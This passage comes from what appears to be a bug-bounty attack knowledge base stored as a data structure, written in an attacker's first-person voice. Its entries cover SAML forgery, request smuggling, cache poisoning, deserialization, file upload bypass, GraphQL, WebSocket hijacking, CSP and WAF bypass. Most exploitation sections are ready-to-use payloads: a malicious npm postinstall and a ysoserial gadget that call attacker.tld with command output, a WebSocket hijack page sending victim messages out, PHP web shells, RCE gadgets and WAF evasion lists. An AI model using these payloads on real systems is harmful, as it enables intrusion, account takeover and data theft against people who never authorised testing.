"title": "SAML Attacks (XML signature wrap / XXE / comments / replay)",
"identity": "SAML XML is famously prone to signature-wrapping (SAMLraider), XXE in metadata, comment-injection (CVE-2018-0114-style).",
"detection": "Burp + SAMLRaider extension. Decode and pretty-print every assertion.",
"exploitation": """### XML Signature Wrapping
Move the signed `<Assertion>` to a different position; insert your unsigned attacker assertion at the location the verifier reads.

### XXE in SAML metadata or assertion
See xxe_all_types.md — same payloads. Often metadata fetch is unauthenticated.

### Comment injection in NameID
Old XML parsers truncate at comment when extracting username:
```xml
<NameID>admin<!--injected-->@target.com</NameID>
```
Verifier extracts `admin@target.com` after stripping comment, but signature was over the full string — bypass.

### Assertion replay
SAML assertion has no nonce → reuse old one if NotOnOrAfter not enforced.

### XSLT injection
Malicious `<ds:Transform>` with XSLT that calls Java methods → RCE.""",
"payloads": "(see exploitation)",
"bypasses": "(see exploitation)",
"chain": "SAML forgery → ATO across all federated apps.",
"tools": "SAMLRaider (Burp), python3-saml debug, xmllint",
"commands": "Burp → SAMLRaider tab → Manipulate SAML request",
"edge": "Modern OpenSAML and python3-saml are hardened; rolled-your-own SAML on PHP is a goldmine.",
"triage": "Show admin assertion forged from valid user assertion.",
"severity": "9.0+.",
"refs": "Duo Labs SAML pitfalls • Ivan Ristic SAML"
},

"race_conditions.md": {
"title": "Race Conditions (Single-Packet Attack / Sub-State / TOCTOU)",
"identity": "Modern race-window is 50ms. Single-packet attack (PortSwigger) collapses to 1ms. I send 30 parallel requests in one TCP packet via HTTP/2 multiplex.",
"detection": "Anywhere `check → mutate` happens: balance check + transfer, coupon redeem, vote, like, account creation, follow, friend invite, file rename.",
"exploitation": """1. Identify check-and-act endpoint.
2. Use Turbo Intruder `race-single-packet-attack` template (HTTP/2). Or BurpSuite Repeater 'Send group in parallel (single packet)'.
3. Submit 30 identical requests in one TCP packet. Server's check passes for each in parallel before any mutation lands.""",
"payloads": "(no payloads — race window is the primitive)",
"bypasses": "Some apps require warm-up request to keep connection cooked; pre-send a benign HEAD.",
"chain": "Race → infinite coupon redemption / double-spend / role escalate via concurrent invites.",
"tools": "Turbo Intruder (Burp), `frogger`, custom Python with `httpx.AsyncClient` + h2",
"commands": """```python
# Turbo Intruder race-single-packet-attack
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=1, engine=Engine.BURP2)
    engine.queue(target.req, gate='race1')
    for i in range(29):
        engine.queue(target.req, gate='race1')
    engine.openGate('race1')
def handleResponse(req, interesting): table.add(req)
```""",
"edge": "Cloudfront / nginx may serialize via single connection; force parallelism with 30 distinct TCP connections OR multiplex via HTTP/2.",
"triage": "Show 1 → N effect (e.g., balance change once expected, but happened 5×).",
"severity": "Financial: 9.0; non-fin: 6.0+.",
"refs": "PortSwigger Single-Packet Attack research"
},

"mass_assignment.md": {
"title": "Mass Assignment / Auto-Binding / Object-Property Pollution",
"identity": "ORM-binders blindly hydrate request body into model. Any framework: Express+mongoose, Rails, Django (DRF), Spring, Laravel. I add forbidden fields and watch them land.",
"detection": "Look at user object response (GET /me) — note all fields. Then PUT/PATCH with each field appended.",
"exploitation": """```http
PATCH /api/users/me
{
  "name": "x",
  "isAdmin": true,
  "role": "admin",
  "permissions": ["*"],
  "verified": true,
  "balance": 999999,
  "tenant_id": "<other_tenant>",
  "_id": "...",
  "id": "...",
  "deleted": false,
  "stripe_customer_id": "cus_attackerwins"
}
```
Test camelCase, snake_case, dot.path, nested objects, `__proto__` (prototype pollution next).""",
"payloads": "(see above)",
"bypasses": "Hidden field name not in API docs — discover via JS source / Swagger / GraphQL introspection.",
"chain": "Mass assignment → role=admin → tenant takeover.",
"tools": "Burp Param Miner, manual fuzz on field names",
"commands": "Burp → Param Miner → Guess JSON parameters",
"edge": "Modern frameworks have allow-lists by default (DRF serializers, Strong Parameters in Rails) — but devs often disable them for speed.",
"triage": "Show role=admin landing in DB + admin endpoint accessible after.",
"severity": "8.5–9.5.",
"refs": "OWASP API Top 10 — API6 Mass Assignment"
},

"http_request_smuggling.md": {
"title": "HTTP Request Smuggling (CL.TE / TE.CL / TE.TE / H2.CL / H2.TE / H2.0)",
"identity": "Front-end + back-end disagree on where a request ends → smuggle a second request that bypasses front-end controls (auth, WAF) and hits back-end with elevated privilege.",
"detection": "Smuggler.py / Burp HTTP Request Smuggler. Differential timing — TE.CL injects pause, CL.TE injects timeout.",
"exploitation": """### CL.TE
```
POST / HTTP/1.1
Host: target
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```

### TE.CL
```
POST / HTTP/1.1
Host: target
Content-Length: 4
Transfer-Encoding: chunked

5c
GPOST / HTTP/1.1
Host: target
Content-Type: application/x-www-form-urlencoded
Content-Length: 15

x=1
0


```

### TE.TE (obfuscate the TE header so one server ignores it)
```
Transfer-Encoding: chunked
Transfer-encoding: x
Transfer-Encoding : chunked
Transfer-Encoding: ,chunked
Transfer-Encoding: x,chunked
```

### H2.CL — desync from HTTP/2 to HTTP/1 backend (CVE-2022-...)
HTTP/2 request with smuggled CL on body; backend HTTP/1.1 reparses.

### H2.TE
HTTP/2 + injected TE header.

### H2.0 — request line injection in HTTP/2 pseudo-header
```
:method GET\\r\\n\\r\\nSMUGGLED:method POST...
```""",
"payloads": "(see exploitation)",
"bypasses": "(see exploitation — TE.TE obfuscation list)",
"chain": "Smuggling → bypass authentication → ATO; smuggling → cache poisoning → mass XSS; smuggling → web cache deception.",
"tools": "smuggler.py (Defparam), Burp HTTP Request Smuggler (PortSwigger), h2cSmuggler",
"commands": """```bash
python3 smuggler.py -u https://target -m GET
# h2c smuggling
python3 h2cSmuggler.py -x http://target -u http://internal-only/
```""",
"edge": "Modern Cloudflare + nginx have hardened; AWS ALB + custom origin still vulnerable. HTTP/2 routing is the new frontier.",
"triage": "Show the second-request response showing privileged data.",
"severity": "9.0+.",
"refs": "PortSwigger Request Smuggling research • Defparam/smuggler"
},

"http_parameter_pollution.md": {
"title": "HTTP Parameter Pollution (HPP)",
"identity": "Two `?param=a&param=b` — different layers parse differently. WAF sees first, app sees last (or concat).",
"detection": "Send duplicate params; observe behavior diff.",
"exploitation": """| Layer | First | Last | Concat |
|---|---|---|---|
| PHP/Apache | last | last | n/a |
| ASP.NET | concat (`,`) | concat | concat |
| ASP/IIS | concat (`,`) | concat | concat |
| Node.js (Express) | array | array | array |
| Python Flask/Django | first | first | n/a |
| Java/Tomcat | first | first | n/a |
| Java/Jetty | first | first | n/a |
| Ruby on Rails | last | last | n/a |
| Perl/CGI | last | last | n/a |""",
"payloads": """```
?id=1&id=2
POST: id=1&id=2
JSON dup keys: {"id":1,"id":2}    (parser-dependent)
```""",
"bypasses": "WAF sees `id=1` (first); app sees `id=2` (last) → bypass.",
"chain": "HPP + auth bypass / WAF bypass / business-logic skew.",
"tools": "Burp Repeater, Param Miner",
"commands": "Manual",
"edge": "Modern frameworks normalize but legacy stacks split. Mixed-stack proxies very common.",
"triage": "Show side-by-side normalization difference.",
"severity": "5–8 (depends on chain).",
"refs": "OWASP HPP • PortSwigger"
},

"cache_poisoning.md": {
"title": "Web Cache Poisoning",
"identity": "Front-end CDN keys a small set of headers. Anything not in cache key but reflected in response = poisonable.",
"detection": "Burp ParamMiner → Discover cache poisoning. Or manual: send `X-Forwarded-Host: attacker.tld` and check if `<base href>` reflects.",
"exploitation": """1. Identify reflected unkeyed header (`X-Forwarded-Host`, `X-Original-URL`, `User-Agent`, `X-Forwarded-Scheme`, `X-Host`, etc.).
2. Inject XSS / open redirect / cache deception payload via that header.
3. Verify `Cache-Control: public` / `X-Cache: HIT` on next request from random IP.
4. Victim hits same URL, gets your poisoned response.""",
"payloads": """```http
X-Forwarded-Host: attacker.tld
X-Forwarded-Scheme: http
X-Host: attacker.tld
X-Forwarded-For: 127.0.0.1
X-Original-URL: /admin
X-Rewrite-URL: /admin
```

Combined with reflected param (`<script src=//$xfh/x.js>`) → mass XSS to every cache hit.""",
"bypasses": "Use unkeyed parameter / header combinations + delimiter manipulation.",
"chain": "Cache poison → mass XSS → mass ATO.",
"tools": "Param Miner (Burp), Web Cache Vulnerability Scanner",
"commands": "Burp → ParamMiner → Discover cache poisoning",
"edge": "Vary headers on response indicate keyed; missing Vary on reflected header = vuln.",
"triage": "Demonstrate the cached version hits a second IP/UA.",
"severity": "8.5+.",
"refs": "PortSwigger Web Cache Poisoning research"
},

"web_cache_deception.md": {
"title": "Web Cache Deception",
"identity": "Cache rules cache by extension; `/account.css` wraps `/account` → static cache stores authenticated content. Random user fetches `/account.css` → gets victim's data.",
"detection": "Find a path that returns dynamic content but URL has cached extension.",
"exploitation": """- Visit `/account/profile.css` (or `.jpg`, `.js`, `.svg`) while logged in. Backend ignores extension, returns dynamic content. CDN caches it.
- Wait briefly. Anonymous request to same URL retrieves cached private response.

Alternative paths:
```
/account/profile;.css
/account/profile.css?cache-bypass-bypass=1
/account/profile/foo.css
/account/profile.css/anything
```""",
"payloads": "(see exploitation)",
"bypasses": "Cache key includes query string → use static file extension only.",
"chain": "Cache deception → session token / PII leak → ATO.",
"tools": "manual",
"commands": """```bash
curl -sk -H \"Cookie: session=$VICTIM\" https://target/account/profile.css
curl -sk https://target/account/profile.css   # different IP / no cookie — should 200 with victim PII
```""",
"edge": "Cloudflare patched generic path cache deception in 2020; vendor-specific configs still vulnerable.",
"triage": "Show victim's PII fetched anonymously.",
"severity": "8.5–9.5.",
"refs": "Omer Gil cache deception"
},

"business_logic_bugs.md": {
"title": "Business Logic Bugs",
"identity": "Highest-paid bugs in 2024. No payload — just creative misuse of the app's own state machine. I always look for: integer overflow / negative numbers, race conditions, multi-step skip, replay, ID swap in workflows, voucher/coupon abuse, refund manipulation, point/balance skew.",
"detection": "Map the state machine. List every transition and verify it can only happen from the prior state. Test replay, skip, branch.",
"exploitation": """Common patterns:
- **Negative quantity** in cart → negative balance → company pays you.
- **Multiplier overflow** — quantity × price overflows 32-bit signed → wraps negative.
- **Replay successful checkout** — backend doesn't dedup `payment_intent_id` → double credit.
- **Skip step** — POST to step 5 directly without 1–4 → state machine accepts.
- **Voucher reuse** — same voucher across items / accounts.
- **Race in sign-up** — same email signs up 2× simultaneously, both verified.
- **Forced state transition** — `PATCH /order/123 {state:'paid'}` works because no state guard.
- **Identity confusion** — `creator_id` accepts any user; victim's content owned by you.
- **Subscription downgrade preserves features** — downgrade does not revoke; pay free, get pro.""",
"payloads": "(no payloads — see exploitation)",
"bypasses": "(no bypasses — logic only)",
"chain": "Logic → financial loss / data exfil / privilege escalation.",
"tools": "Burp Repeater + state diagram + creativity",
"commands": "Manual + Postman/Bruno",
"edge": "Triagers are picky — show concrete loss/gain quantified ($X gain).",
"triage": "Always quantify dollar / point / data impact.",
"severity": "Up to 9.8 (financial fraud).",
"refs": "PortSwigger Business Logic Vulnerabilities"
},

"subdomain_takeover.md": {
"title": "Subdomain Takeover",
"identity": "Sub CNAMEs to a service the org no longer owns (S3, Heroku, Github Pages, Vercel, Netlify, Azure CDN, Fastly, Cloudfront, Shopify, Tilda). Register that resource → host content under target.com.",
"detection": "`dnsx -cname -resp` then for each CNAME, fetch and look for the service's \"unclaimed\" fingerprint (e.g., S3 'NoSuchBucket', Heroku 'no-such-app').",
"exploitation": """1. Find dangling CNAME.
2. Identify service from the response error.
3. Register/claim that resource on the third-party service.
4. Host content / serve cookies under `target.com`.""",
"payloads": "(no payloads)",
"bypasses": "(some services moved to per-account claim verification — Heroku, Github Pages now require domain verification; legacy still works.)",
"chain": "Takeover → cookie/CORS-trust abuse (cookies set on parent domain become accessible) → cross-site authenticated XSS / ATO.",
"tools": "subjack, nuclei (http/takeovers/), takeover, Project Discovery 'subzy'",
"commands": """```bash
subjack -w subs.txt -t 100 -timeout 30 -ssl -c ~/tools/subjack/fingerprints.json -v -o takeovers.txt
nuclei -l alive.txt -t http/takeovers/ -severity high,critical
subzy run --targets subs.txt --hide_fails
```""",
"edge": "Vercel/Netlify added strict domain verification; old `_vercel` TXT-style targets still claimable. Test before declaring.",
"triage": "Show served content from your account on target's domain.",
"severity": "8.0+ (high if cookie/CORS-trust applies).",
"refs": "EdOverflow can-i-take-over-xyz • PayloadsAllTheThings/Subdomain Takeover"
},

"dependency_confusion.md": {
"title": "Dependency Confusion",
"identity": "Internal package name leaked → publish same name on public registry → CI / dev installs your package → RCE in build environment.",
"detection": "Read `package.json`, `requirements.txt`, `pom.xml`, `Gemfile.lock`, `go.mod`. Look for unscoped names not on public registry.",
"exploitation": """1. Identify internal package name `@example/internal-utils` (scope owned by victim) or unscoped `examplecorp-secret-tool`.
2. Check public registry — if no `@example` org owned, register the org. Publish `@example/internal-utils` with malicious postinstall:
```js
{
  "name": "@example/internal-utils",
  "version": "9999.99.99",
  "scripts": { "postinstall": "node -e \\"require('https').get('https://attacker.tld/?d='+require('os').hostname()+'-'+require('child_process').execSync('id'))\\"" }
}
```
3. Wait for victim CI/dev install.""",
"payloads": "(see above)",
"bypasses": "Scope claim race — register scope first.",
"chain": "Build-RCE → CI secrets → cloud takeover.",
"tools": "Confused (Visma), depcon, dependency-combobulator",
"commands": """```bash
confused -l npm package.json
confused -l pypi requirements.txt
confused -l mvn pom.xml
```""",
"edge": "Most ecosystems have hardened (npm scope confusion mitigated by orgs; pip private index priority). Still alive in mid-size orgs without internal registries.",
"triage": "PoC must include callback (DNS / HTTP) confirming exec inside victim infra.",
"severity": "9.0+.",
"refs": "Alex Birsan original article • Confused (Visma) tool"
},

"prototype_pollution.md": {
"title": "Prototype Pollution (Server + Client)",
"identity": "JS object prototype mutation via untrusted merge / clone / lodash.set. Server-side: RCE / auth bypass. Client-side: XSS / DOM clobbering.",
"detection": "Inject `__proto__[isAdmin]=true` or `constructor.prototype.foo=bar` and observe later property reads.",
"exploitation": """### Server-side (Node)
```http
POST /api/profile
{"name":"x","__proto__":{"isAdmin":true}}
POST /api/profile
{"name":"x","constructor":{"prototype":{"isAdmin":true}}}
```

### Client-side
```
?__proto__[innerHTML]=<img src=x onerror=alert(1)>
?constructor[prototype][innerHTML]=<img src=x onerror=alert(1)>
?__proto__.src=//attacker.tld/x.js
```

### Lodash chain
- `_.merge`, `_.set`, `_.defaultsDeep` are sinks. Detection: pollute `__proto__.toString` and look for crashes.

### Gadget chain (popular)
- jQuery `extend`, lodash `mergeWith`, Mongoose merge → chain to RCE via:
  - `child_process.spawn` env injection
  - require('module')._extensions or Module._cache pollution""",
"payloads": "(see above)",
"bypasses": "Block list of `__proto__` → use `constructor.prototype`. Block list of both → use Object.prototype directly via `[\\\"constructor\\\"][\\\"prototype\\\"]`.",
"chain": "Pollute `isAdmin: true` → BFLA. Pollute `process.env.NODE_OPTIONS=--inspect` → RCE.",
"tools": "PPScan, ppmap, ppfuzz",
"commands": """```bash
go run ppfuzz https://target/?param=value
node ppmap-detection.js https://target
```""",
"edge": "Client-side PP often combines with template-literal HTML to chain to XSS.",
"triage": "Show end-to-end RCE or admin access.",
"severity": "8.5–9.8.",
"refs": "Snyk PP research • PortSwigger PP labs • Mansoor Lerocha PP RCE chains"
},

"deserialization_all_langs.md": {
"title": "Insecure Deserialization (Java / .NET / Python / Ruby / PHP / Node)",
"identity": "Deserializing attacker-controlled bytes against a class graph triggers gadget chains that lead to RCE. I generate gadgets via ysoserial / marshalsec / ysoserial.net / phpggc.",
"detection": "Look for serialized blobs (Base64 starts with `rO0` Java, `AAEAAA` .NET, `pickle` headers, `O:` PHP, ``;` Ruby Marshal, ``msgpack`` etc.).",
"exploitation": """### Java
```bash
# Find gadget — Apache Commons-Collections, Jackson, XStream, Hessian
java -jar ysoserial.jar CommonsCollections5 'curl http://attacker.tld/$(whoami)' | base64 -w0
# inject into cookie / param / RMI / JMX
```

### .NET
```bash
ysoserial.net -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -e ..."
# Or for ObjectStateFormatter / LosFormatter / DataContractSerializer
```

### Python pickle
```python
import pickle, base64
class E:
  def __reduce__(self): return (__import__('os').system, ('id',))
print(base64.b64encode(pickle.dumps(E())).decode())
```

### Ruby Marshal
```ruby
require 'erb'; require 'base64'
class Gadget
  def init; ERB.new("<% `id` %>").result; end
  def marshal_dump; init; '' ; end
end
puts Base64.encode64(Marshal.dump(Gadget.new))
```

### PHP unserialize
Use `phpggc` for many gadgets:
```bash
phpggc Symfony/RCE4 system id -b
```

### Node.js — node-serialize / serialize-javascript
```js
{"rce":"_$$ND_FUNC$$_function (){require('child_process').exec('id', function(e,o){console.log(o)});}()"}
```""",
"payloads": "(see above)",
"bypasses": "Block list of class names → chain via reflective gadgets / proxy gadgets.",
"chain": "Deserialization → RCE → cluster takeover.",
"tools": "ysoserial, ysoserial.net, marshalsec, phpggc, frohoff/JNDIExploit",
"commands": "(see above)",
"edge": "Modern Java with `JEP 290` filter requires explicit allow-list — bypass via classes already on filter.",
"triage": "Show full RCE PoC.",
"severity": "9.8.",
"refs": "frohoff/ysoserial • pwntester/ysoserial.net • snoopysecurity/awesome-deserialization"
},

"file_upload_bypass.md": {
"title": "File Upload Bypass → RCE / Stored XSS / SSRF / DoS",
"identity": "I bypass MIME / extension / magic-byte / content-scan filters with polyglots, double-extensions, null bytes, archive parsing, and metadata injection.",
"detection": "Map upload endpoint. Note allowed extensions, MIME, max size. Check whether the upload path is web-rooted and executable.",
"exploitation": """### Bypass extension filter
```
shell.php
shell.PHP
shell.pHp
shell.php.jpg
shell.jpg.php
shell.php5
shell.phtml
shell.phar
shell.pht
shell.inc
shell.php\\x00.jpg
shell.php%00.jpg
shell.php;.jpg
shell.php:.jpg     (NTFS alt data stream)
shell.php/         (some servers strip trailing slash)
shell.php.        (Windows trailing dot)
.htaccess          (override mime exec for current dir)
```

### Bypass MIME — set Content-Type
```
Content-Type: image/png    + body PHP code
```

### Bypass magic byte
```
GIF89a;<?php system($_GET['c']); ?>
```

### Polyglot files
- GIF + PHP polyglot
- JPEG with PHP in EXIF comment
- PDF + JS payload (XSS in PDF viewers)
- SVG + XSS / XXE
- ZIP + symlink (Zip slip)
- Phar + polyglot for unserialize trigger

### .htaccess override (Apache)
```
AddType application/x-httpd-php .pwn
```
Then upload `shell.pwn`.

### web.config override (IIS)
```xml
<configuration>
 <system.webServer>
  <handlers>
   <add name="x" path="*.config" verb="*" type="System.Web.UI.PageHandlerFactory" />
  </handlers>
 </system.webServer>
</configuration>
```

### SVG XSS
```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)"/>
```

### Zip slip
Archive contains `../../../../var/www/html/shell.php` — extracts traversal-up.""",
"payloads": "(see above)",
"bypasses": "(see above — extension/MIME/magic/encoding tiers)",
"chain": "RCE / Stored XSS / file overwrite / DoS via zip bomb.",
"tools": "Burp Upload Scanner, mlcsec/upload-bypass, manual Hackvertor",
"commands": "Burp Repeater + Upload Scanner ext",
"edge": "Static-only buckets (S3) won't execute PHP; but XSS via SVG/HTML still works.",
"triage": "Show RCE via uploaded shell + execution.",
"severity": "9.8 if RCE.",
"refs": "PortSwigger File Upload • PayloadsAllTheThings/Upload Insecure Files"
},

"graphql_attacks.md": {
"title": "GraphQL Attacks",
"identity": "GraphQL flattens authorization. I focus on: introspection, batched queries, alias-based brute, depth-limit DoS, IDOR via field, GraphQL → SQL/SSRF/RCE.",
"detection": "Find `/graphql`, `/api/graphql`, `/v1/graphql`, `graphiql`. Test introspection.",
"exploitation": """### Introspection enabled
```
query { __schema { types { name fields { name } } } }
```

### Alias-based bypass of per-field rate limit / log
```graphql
query { a:user(id:1){email} b:user(id:2){email} c:user(id:3){email} }
```

### Batched queries
```json
[{\"query\":\"{ user(id:1){email} }\"}, {\"query\":\"{ user(id:2){email} }\"}]
```

### Field-level IDOR
```graphql
query { user(id:\"OTHER_USER_UUID\"){ email phone ssn } }
```

### Mutation injection (no auth on mutations)
```graphql
mutation { updateUserRole(userId:\"victim\", role:\"admin\") { id role } }
```

### Depth-limit DoS
```graphql
query Q($x:ID!){ user(id:$x){ posts{ author{ posts{ author{ posts{ author{ id }}}}}}}}
```

### CSRF on GraphQL via GET (when GET enabled)
```
GET /graphql?query={user(id:1){email}}
```

### SSRF/SQLi via field args (custom resolvers)
```graphql
query { rawSearch(filter:\"' OR 1=1-- -\") { items } }
```

### File upload via multipart spec
Test if `Upload` scalar is exposed → arbitrary file upload (often unauth).""",
"payloads": "(see above)",
"bypasses": "Disabled introspection → clairvoyance schema brute. Suggestions disabled → wordlist.",
"chain": "GraphQL IDOR + alias batching + introspection = mass PII dump.",
"tools": "graphw00f, clairvoyance, inql, graphql-cop, BatchQL",
"commands": """```bash
graphw00f -d -t https://target/graphql
clairvoyance -o schema.json -w ~/wordlists/graphql/graphql-words.txt https://target/graphql
inql -t https://target/graphql --generate-html
```""",
"edge": "AWS AppSync / Hasura / Apollo Federation each have engine-specific quirks — fingerprint first.",
"triage": "Show authorization bypass via field aliasing + privileged data exfil.",
"severity": "8.0–9.5.",
"refs": "Doyensec GraphQL • PortSwigger GraphQL labs • bb_kb/GraphQL/"
},

"websocket_attacks.md": {
"title": "WebSocket Attacks (CSWSH / Auth bypass / Injection / DoS)",
"identity": "WebSockets bypass CORS by default. CSWSH = Cross-Site WebSocket Hijacking — same as CSRF but for WS.",
"detection": "Find ws/wss endpoints. Check Origin validation, Sec-WebSocket-Key, auth model (cookie? token in URL?).",
"exploitation": """### CSWSH (no Origin check)
Attacker page:
```html
<script>
const ws = new WebSocket('wss://target.com/ws');
ws.onmessage = e => fetch('https://attacker.tld/?d='+btoa(e.data));
ws.onopen = () => ws.send('{\"action\":\"subscribe\",\"channel\":\"private:'+victim+'\"}');
</script>
```

### Token in URL leak
`wss://target/ws?token=eyJ...` → tokens land in browser history, server logs, referer headers.

### Message-level injection
WS app passes raw payload to backend RPC; SQLi/XSS/SSRF still possible.

### DoS — large frame / flood
Send 10MB frame; many WS impls don't limit.

### Authentication bypass via subscribe
Subscribe to channels named after other users without auth check.""",
"payloads": "(see above)",
"bypasses": "Origin enforcement — most fail by accepting `null` (sandboxed iframe) or partial-match.",
"chain": "CSWSH + private channel subscribe = victim message exfil + ATO via support chat.",
"tools": "wscat, websocat, Burp WebSocket tab",
"commands": """```bash
wscat -c \"wss://target/ws\" -H \"Authorization: Bearer $T\"
websocat \"wss://target/ws?token=$T\"
```""",
"edge": "STOMP/SockJS often layer on WS — auth model differs.",
"triage": "Show victim's private message intercepted by attacker page.",
"severity": "7.5–9.0.",
"refs": "PortSwigger WebSockets"
},

"csrf_websocket.md": {
"title": "Cross-Site WebSocket Hijacking (CSWSH) — dedicated",
"identity": "Same as websocket_attacks.md CSWSH section but isolated for clarity.",
"detection": "Origin not validated on WS handshake.",
"exploitation": "(see websocket_attacks.md)",
"payloads": "(see websocket_attacks.md)",
"bypasses": "(see websocket_attacks.md)",
"chain": "(see websocket_attacks.md)",
"tools": "websocket-csrf-poc generator",
"commands": "Burp → Engagement Tools → WebSocket CSRF PoC",
"edge": "Cookie-based WS auth + missing Origin check is the only route. Token-in-Header WS auth is safe.",
"triage": "Show cross-site script subscribing as victim.",
"severity": "8.0+.",
"refs": "PortSwigger CSWSH"
},

"postmessage_attacks.md": {
"title": "postMessage Attacks",
"identity": "Cross-origin window.postMessage handlers without origin check or with weak deserialization → DOM XSS / data exfil.",
"detection": "Grep client JS for `addEventListener('message',...)` and `window.onmessage`. Look for missing `event.origin` checks or deserialization of `event.data`.",
"exploitation": """### Missing origin check
```javascript
// vulnerable handler
window.addEventListener('message', e => {
  document.getElementById('x').innerHTML = e.data.html;   // XSS
});
```
Attacker page:
```html
<iframe src=\"https://target.com/?x=1\" id=t></iframe>
<script>document.getElementById('t').contentWindow.postMessage({html:'<img src=x onerror=alert(1)>'},'*')</script>
```

### Weak origin check (substring)
```javascript
if (e.origin.includes('target.com')) { ... }   // matches target.com.attacker.tld
```

### eval / function ctor on data
```javascript
window.addEventListener('message', e => eval(e.data));   // RCE-like via XSS
```""",
"payloads": "(see above)",
"bypasses": "Origin must use exact equality. Devs often write `startsWith` or `includes` → bypassable.",
"chain": "postMessage → DOM XSS → ATO.",
"tools": "Burp DOM Invader (post message tab) — best automated detector",
"commands": "DOM Invader → toggle postMessage logging → walk app",
"edge": "Modern apps use BroadcastChannel and structured cloning — same risk class.",
"triage": "Show DOM XSS PoC firing from attacker.tld iframe parent.",
"severity": "7.5–9.0.",
"refs": "PortSwigger DOM Invader / postMessage"
},

"dom_clobbering.md": {
"title": "DOM Clobbering",
"identity": "HTML elements with `id`/`name` attributes shadow `window`/`document` properties → break security checks. Useful when CSP blocks scripts but allows HTML.",
"detection": "Find code like `if (window.config && config.allow)` or `document.someName.foo` — clobbber these via injected HTML.",
"exploitation": """```html
<a id=defaultAvatar href=evil.tld>
<form id=user><input id=isAdmin value=true>
<img name=cookie src=//attacker.tld>
```

PortSwigger DOMPurify clobbering bypass via `<form><input id=attributes>`.""",
"payloads": "(see above)",
"bypasses": "Even sanitized HTML may permit <a id=...> and <input id=...>.",
"chain": "Combined with CSP-restricted XSS to bypass nonce validation when nonce is read from `document.x`.",
"tools": "Burp DOM Invader",
"commands": "DOM Invader walks for clobberable globals automatically",
"edge": "Modern apps use Shadow DOM and `window.x` reads behind closures — clobbering doesn't shadow those.",
"triage": "Show end-to-end privilege escalation / XSS that required clobbering.",
"severity": "6.5–8.5.",
"refs": "PortSwigger DOM Clobbering • s1r1us research"
},

"iframe_attacks.md": {
"title": "Iframe-based Attacks (sandbox escape, srcdoc XSS, frame busting bypass)",
"identity": "Sandboxed iframes have policy quirks. srcdoc + missing CSP yields cross-origin XSS in sandboxed contexts.",
"detection": "Map all iframes. Check sandbox attributes, CSP frame-ancestors, postMessage flow.",
"exploitation": """- `sandbox=\"allow-scripts allow-same-origin\"` is effectively no sandbox.
- iframe `srcdoc` has same-origin context → `<iframe srcdoc='<script>...'></script>` runs as parent.
- Frame busting via `top.location` blocked by sandbox=\"allow-top-navigation\" missing → still embedded for clickjacking.""",
"payloads": "(see above)",
"bypasses": "(see above)",
"chain": "Iframe XSS in third-party widget embedded by target → mass XSS on target's own users.",
"tools": "manual",
"commands": "manual",
"edge": "Modern browsers added Strict-Transport / Cross-Origin-Embedder; check support per browser.",
"triage": "Show actual XSS firing in target's main origin.",
"severity": "7.0–8.5.",
"refs": "MDN iframe sandbox • PortSwigger labs"
},

"csp_bypass.md": {
"title": "Content Security Policy (CSP) Bypass",
"identity": "Strict CSP feels invincible until you find a JSONP endpoint, Angular gadget, or trusted CDN exposing a script that takes user-controlled args.",
"detection": "Read CSP header. List directives. Find weak host whitelists.",
"exploitation": """### unsafe-inline / unsafe-eval present
Game over. Your XSS just runs.

### JSONP gadget on whitelisted domain
```html
<script src=https://accounts.google.com/o/oauth2/revoke?callback=alert(document.domain)></script>
<script src=https://www.google.com/jsapi?callback=alert(1)></script>
```

### AngularJS gadget (when ng* runtime allowed)
```html
<div ng-app ng-csp><div ng-click=$event.view.alert(document.domain)>x</div></div>
```

### data: scheme allowed in script-src
```html
<script src=\"data:,alert(document.domain)\"></script>
```

### Object / base / form action tricks
- `<base href=//attacker.tld>` redirects all relative resources.
- `<object data=...>` if `object-src 'self'` lax.

### Nonce reuse
If app reflects `nonce` from URL into CSP nonce attribute → clone nonce into your script tag.

### Trusted CDN takeover
- `script-src 'self' https://cdn.example.com` — find unclaimed S3 / Cloudfront under `cdn.example.com`.""",
"payloads": "(see above)",
"bypasses": """Look for: jsonp, angular, vue, reactjs runtime, nonce reflection, base href, dangling cdn, expression-evaluators.""",
"chain": "CSP bypass + reflected XSS = full XSS exploitation.",
"tools": "csp-evaluator (Google), `csptester`, manual",
"commands": """```bash
curl -sI https://target | grep -i content-security-policy
csp-evaluator-cli https://target
```""",
"edge": "Strict-Dynamic CSP closes most JSONP gadgets but still bypassable via DOM-clobbered nonce.",
"triage": "Show running XSS while CSP header present.",
"severity": "+1.0–2.0 over base XSS severity.",
"refs": "csp-evaluator.withgoogle.com • PortSwigger CSP"
},

"waf_bypass_all_techniques.md": {
"title": "WAF Bypass — All Techniques",
"identity": "WAF is a signature engine. I outflank by encoding, fragmentation, parameter pollution, HTTP/2 differential, body-size oversized, request smuggling, and origin discovery.",
"detection": "Identify WAF (wafw00f, headers, cookies, block-page fingerprint). Each WAF has known bypass tier.",
"exploitation": "(see SEC: WAF tiers below)",
"payloads": "(see PAYLOADS/waf_bypass_payloads.md)",
"bypasses": """### Encoding
- URL: `%3C` `%253C` `%2525...`
- HTML entity: `&lt;` `&#x3c;` `&#60;`
- Unicode: `\\u003c` `\\x3c`
- UTF-7: `+ADw-`
- UTF-16 BOM
- HTTP/0.9 throwback (WAF doesn't parse)

### Fragmentation
- HTTP Parameter Pollution: `?q=harm&q=<svg>`
- Body chunking — split payload across chunks
- Multipart MIME variants

### Headers
- `Transfer-Encoding: chunked` smuggling
- HTTP/2 lone-pseudo
- Trailing whitespace in header name (WAF normalizes, server doesn't)

### Origin discovery (best long-term bypass)
- Find origin IP behind WAF (cert SAN match on Shodan / favicon hash / SecurityTrails historical A) → hit origin directly.

### Method
- `GET → POST` swap if WAF only inspects GET
- `OPTIONS` / `TRACE` / WebDAV methods

### Timing
- Slow drip — submit one byte per second
- Connection reuse abuse

### Body size
- WAF inspects first N bytes; pad with junk before payload (AWS WAF default 8KB)

### Case
- `<ScRiPt>`, `SeLeCt`

### Whitespace
- `%09 %0a %0b %0c %0d %a0` between tokens

### Comments
- SQL: `/**/`
- HTML: `<!---->`""",
"chain": "Bypass WAF → land XSS / SQLi / RCE in upstream that didn't expect to be reached.",
"tools": "wafw00f, Hackvertor (Burp), nowafpls",
"commands": """```bash
wafw00f https://target
nowafpls   # Burp ext: appends junk to bypass body inspection size
```""",
"edge": "Vendor patches happen daily. Always start with origin discovery — fundamental win.",
